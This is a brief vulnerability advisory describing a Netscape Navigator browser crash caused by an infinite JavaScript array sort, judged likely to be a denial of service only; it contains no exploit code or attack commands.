Netscape Navigator is prone to a vulnerability that may result in a browser crash. This issue is exposed when the browser performs an infinite JavaScript array sort operation. It is conjectured that this will only result in a denial of service and is not further exploitable to execute arbitrary code, though this has not been confirmed.
